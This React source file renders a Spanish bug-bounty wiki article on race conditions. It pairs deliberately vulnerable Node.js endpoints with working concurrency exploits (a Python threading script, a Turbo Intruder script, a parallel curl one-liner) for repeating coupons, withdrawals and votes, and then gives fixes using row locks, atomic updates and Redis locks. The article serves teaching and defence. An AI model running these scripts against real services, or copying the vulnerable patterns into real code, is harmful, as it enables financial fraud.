/**
 * RACE CONDITIONS
 * Explotar condiciones de carrera en lógica de negocio
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Zap, Timer, DollarSign, Shield, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function RaceConditionsContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="¿Qué es una Race Condition?">
        <Paragraph>
          Una <Strong>Race Condition</Strong> ocurre cuando múltiples threads/procesos acceden a 
          un recurso compartido sin sincronización adecuada. En aplicaciones web, esto permite 
          <Strong>usar cupones múltiples veces</Strong>, <Strong>retirar más dinero del disponible</Strong>, 
          o <Strong>comprar items agotados</Strong>.
        </Paragraph>

        <AlertDanger title="Impacto Financiero">
          <ul className="mt-2 space-y-1">
            <ListItem>💰 Retirar $1000 con saldo de $100</ListItem>
            <ListItem>🎟️ Usar el mismo cupón de descuento infinitas veces</ListItem>
            <ListItem>🎁 Reclamar el mismo reward múltiples veces</ListItem>
            <ListItem>📦 Comprar items con stock = 0</ListItem>
            <ListItem>⭐ Incrementar puntos/créditos ilimitadamente</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="ejemplo-vulnerable" title="1. Código Vulnerable Clásico">
        <Subsection title="Transferencia de Dinero sin Locks">
          <CodeBlock
            language="javascript"
            title="Node.js - Vulnerable a race condition"
            code={`app.post('/api/withdraw', async (req, res) => {
  const { userId, amount } = req.body;
  
  // 1. Leer saldo actual
  const user = await db.users.findById(userId);
  
  // 2. Verificar si hay fondos suficientes
  if (user.balance < amount) {
    return res.status(400).json({ error: 'Insufficient funds' });
  }
  
  // ⏱️ TIEMPO DE VULNERABILIDAD ⏱️
  // Si llega otro request aquí, ambos verán el mismo balance
  
  // 3. Decrementar saldo
  await db.users.updateOne(
    { id: userId },
    { balance: user.balance - amount }
  );
  
  res.json({ success: true, new_balance: user.balance - amount });
});`}
          />
        </Subsection>

        <Subsection title="Escenario de Ataque">
          <HighlightBox color="red">
            <Strong>Estado Inicial:</Strong> Usuario tiene $100 en cuenta
          </HighlightBox>

          <CodeBlock
            language="text"
            title="Timeline del ataque"
            code={`T=0ms   Request #1 llega → Lee balance = $100
T=1ms   Request #2 llega → Lee balance = $100  ← ¡Mismo valor!
T=2ms   Request #1 verifica: $100 >= $80? ✅
T=3ms   Request #2 verifica: $100 >= $80? ✅
T=4ms   Request #1 actualiza: balance = $100 - $80 = $20
T=5ms   Request #2 actualiza: balance = $100 - $80 = $20

RESULTADO: Usuario retiró $160 pero balance final = $20
           Debería ser $100 - $160 = -$60 (rechazado)`}
          />

          <AlertWarning>
            El atacante envió 2 requests simultáneos de $80 cada uno, 
            retirando $160 con solo $100 de saldo.
          </AlertWarning>
        </Subsection>
      </Section>

      <Section id="exploit-cupon" title="2. Exploit - Cupón Infinito">
        <CodeBlock
          language="javascript"
          title="Código vulnerable - Aplicar cupón"
          code={`app.post('/api/apply-coupon', async (req, res) => {
  const { userId, couponCode } = req.body;
  
  // 1. Verificar que cupón existe y es válido
  const coupon = await db.coupons.findOne({ code: couponCode });
  
  if (!coupon || coupon.used_count >= coupon.max_uses) {
    return res.status(400).json({ error: 'Invalid coupon' });
  }
  
  // ⏱️ RACE CONDITION WINDOW ⏱️
  
  // 2. Incrementar contador de usos
  await db.coupons.updateOne(
    { code: couponCode },
    { used_count: coupon.used_count + 1 }
  );
  
  // 3. Aplicar descuento al usuario
  await db.users.updateOne(
    { id: userId },
    { discount: coupon.amount }
  );
  
  res.json({ success: true });
});`}
        />

        <Subsection title="Script de Explotación">
          <CodeBlock
            language="python"
            title="exploit.py - Usar cupón 100 veces"
            code={`import requests
import threading

URL = "https://target.com/api/apply-coupon"
COOKIE = "session=your_session_here"

def apply_coupon():
    response = requests.post(
        URL,
        json={
            "userId": 123,
            "couponCode": "SAVE50"
        },
        cookies={"session": COOKIE}
    )
    print(f"Response: {response.status_code}")

# Enviar 100 requests simultáneos
threads = []
for i in range(100):
    t = threading.Thread(target=apply_coupon)
    threads.append(t)
    t.start()

# Esperar a que terminen todos
for t in threads:
    t.join()

print("[+] Attack completed! Check your discount balance.")`}
          />

          <TerminalOutput title="Resultado del exploit">
            {`Response: 200
Response: 200
Response: 200
...
[+] Attack completed! Check your discount balance.

# Verificar cuenta
GET /api/profile

{
  "balance": $5000,  ← ¡Cupón de $50 usado 100 veces!
  "original_balance": $0
}`}
          </TerminalOutput>
        </Subsection>
      </Section>

      <Section id="burp-repeater" title="3. Explotación con Burp Suite">
        <AlertTip title="Turbo Intruder Extension">
          Burp tiene una extensión llamada <Strong>Turbo Intruder</Strong> diseñada 
          específicamente para explotar race conditions con requests paralelos.
        </AlertTip>

        <Subsection title="Paso 1: Capturar Request">
          <TerminalOutput title="Request vulnerable">
            {`POST /api/redeem-reward HTTP/1.1
Host: vulnerable-app.com
Cookie: session=abc123
Content-Type: application/json

{
  "reward_id": 42,
  "user_id": 123
}`}
          </TerminalOutput>
        </Subsection>

        <Subsection title="Paso 2: Turbo Intruder Script">
          <CodeBlock
            language="python"
            title="turbo-intruder.py"
            code={`def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=50,  # 50 conexiones paralelas
        requestsPerConnection=10,
        pipeline=False
    )

    # Enviar 100 requests idénticos simultáneamente
    for i in range(100):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)`}
          />

          <AlertInfo>
            Con <InlineCode>concurrentConnections=50</InlineCode>, Turbo Intruder envía 
            requests en paralelo verdadero, maximizando la probabilidad de race condition.
          </AlertInfo>
        </Subsection>

        <Subsection title="Paso 3: Analizar Resultados">
          <CodeBlock
            language="text"
            title="Respuestas esperadas"
            code={`# Si vulnerable:
Request #1: {"status": "success", "points_added": 1000}
Request #2: {"status": "success", "points_added": 1000}
Request #3: {"status": "success", "points_added": 1000}
...
Request #100: {"status": "success", "points_added": 1000}

Total points: 100,000 (debería ser 1,000)

# Si protegido correctamente:
Request #1: {"status": "success", "points_added": 1000}
Request #2: {"status": "error", "message": "Already redeemed"}
Request #3: {"status": "error", "message": "Already redeemed"}
...`}
          />
        </Subsection>
      </Section>

      <Section id="limit-override" title="4. Limit Override Race Condition">
        <Paragraph>
          Aplicaciones que limitan acciones (ej: 5 votos por día) son vulnerables si el check 
          y el incremento no son atómicos:
        </Paragraph>

        <CodeBlock
          language="javascript"
          title="Código vulnerable - Límite de votos"
          code={`app.post('/api/vote', async (req, res) => {
  const { userId, postId } = req.body;
  
  // 1. Contar votos actuales
  const votes = await db.votes.count({
    user_id: userId,
    date: today
  });
  
  // 2. Verificar límite
  if (votes >= 5) {
    return res.status(429).json({ error: 'Daily limit exceeded' });
  }
  
  // ⏱️ RACE CONDITION ⏱️
  
  // 3. Crear voto
  await db.votes.create({
    user_id: userId,
    post_id: postId,
    date: today
  });
  
  res.json({ success: true });
});`}
        />

        <Subsection title="Exploit - 100 Votos en 1 Segundo">
          <CodeBlock
            language="bash"
            title="Enviar requests simultáneos con parallel"
            code={`# Crear archivo con URL y payload
cat > vote_payload.json <<EOF
{
  "userId": 123,
  "postId": 456
}
EOF

# Enviar 100 requests paralelos con GNU parallel
seq 1 100 | parallel -j 100 \\
  curl -X POST https://target.com/api/vote \\
    -H "Cookie: session=abc123" \\
    -H "Content-Type: application/json" \\
    -d @vote_payload.json

# Resultado: 100 votos creados, límite era 5`}
          />
        </Subsection>
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Solución: Operaciones Atómicas + Database Locks">
          La única forma segura es usar locks de base de datos o transacciones atómicas.
        </AlertDanger>

        <Subsection title="1. Database Transactions con Row Locking">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - PostgreSQL con SELECT FOR UPDATE"
            code={`const { Pool } = require('pg');
const pool = new Pool();

app.post('/api/withdraw', async (req, res) => {
  const { userId, amount } = req.body;
  const client = await pool.connect();
  
  try {
    // Iniciar transacción
    await client.query('BEGIN');
    
    // ✅ LOCK de fila - nadie más puede leer/modificar hasta COMMIT
    const result = await client.query(
      'SELECT balance FROM users WHERE id = $1 FOR UPDATE',
      [userId]
    );
    
    const balance = result.rows[0].balance;
    
    if (balance < amount) {
      await client.query('ROLLBACK');
      return res.status(400).json({ error: 'Insufficient funds' });
    }
    
    // Actualizar balance
    await client.query(
      'UPDATE users SET balance = balance - $1 WHERE id = $2',
      [amount, userId]
    );
    
    // Commit - liberar lock
    await client.query('COMMIT');
    
    res.json({ success: true });
    
  } catch (error) {
    await client.query('ROLLBACK');
    res.status(500).json({ error: 'Transaction failed' });
  } finally {
    client.release();
  }
});`}
          />

          <AlertInfo title="FOR UPDATE">
            <InlineCode>SELECT ... FOR UPDATE</InlineCode> crea un lock exclusivo en la fila. 
            Otros requests esperarán hasta que el primero haga COMMIT o ROLLBACK.
          </AlertInfo>
        </Subsection>

        <Subsection title="2. Atomic Increment (MongoDB)">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Usar operadores atómicos"
            code={`app.post('/api/apply-coupon', async (req, res) => {
  const { userId, couponCode } = req.body;
  
  // ✅ SEGURO - Incremento atómico con findOneAndUpdate
  const result = await db.coupons.findOneAndUpdate(
    {
      code: couponCode,
      used_count: { $lt: 100 }  // Solo si aún no llegó al límite
    },
    {
      $inc: { used_count: 1 }    // Incrementar atómicamente
    },
    {
      returnDocument: 'after'
    }
  );
  
  if (!result) {
    return res.status(400).json({ error: 'Coupon exhausted or invalid' });
  }
  
  // Aplicar descuento
  await db.users.updateOne(
    { id: userId },
    { $inc: { discount: result.amount } }
  );
  
  res.json({ success: true });
});`}
          />
        </Subsection>

        <Subsection title="3. Redis Distributed Lock">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Lock distribuido con Redis"
            code={`const Redis = require('ioredis');
const redis = new Redis();

async function withLock(key, ttl, callback) {
  const lockKey = \`lock:\${key}\`;
  const lockValue = Math.random().toString(36);
  
  // Intentar obtener lock
  const acquired = await redis.set(
    lockKey,
    lockValue,
    'EX', ttl,     // Expira en ttl segundos
    'NX'           // Solo si no existe
  );
  
  if (!acquired) {
    throw new Error('Could not acquire lock');
  }
  
  try {
    return await callback();
  } finally {
    // Liberar lock solo si es nuestro
    const script = \`
      if redis.call("get", KEYS[1]) == ARGV[1] then
        return redis.call("del", KEYS[1])
      else
        return 0
      end
    \`;
    await redis.eval(script, 1, lockKey, lockValue);
  }
}

app.post('/api/withdraw', async (req, res) => {
  const { userId, amount } = req.body;
  
  try {
    // ✅ SEGURO - Solo un request puede ejecutar a la vez por usuario
    await withLock(\`user:\${userId}\`, 10, async () => {
      const user = await db.users.findById(userId);
      
      if (user.balance < amount) {
        throw new Error('Insufficient funds');
      }
      
      await db.users.updateOne(
        { id: userId },
        { balance: user.balance - amount }
      );
    });
    
    res.json({ success: true });
    
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});`}
          />
        </Subsection>

        <Subsection title="4. Rate Limiting por Usuario">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Limitar requests por usuario"
            code={`const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');

const limiter = rateLimit({
  store: new RedisStore({
    client: redis
  }),
  windowMs: 1000,  // 1 segundo
  max: 1,          // Solo 1 request por segundo por usuario
  keyGenerator: (req) => \`user:\${req.body.userId}\`,
  handler: (req, res) => {
    res.status(429).json({
      error: 'Too many requests, please slow down'
    });
  }
});

app.post('/api/withdraw', limiter, async (req, res) => {
  // ... lógica de retiro
});`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: JWT Vulnerabilities</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/jwt-vulnerabilities`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Explotar JSON Web Tokens</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
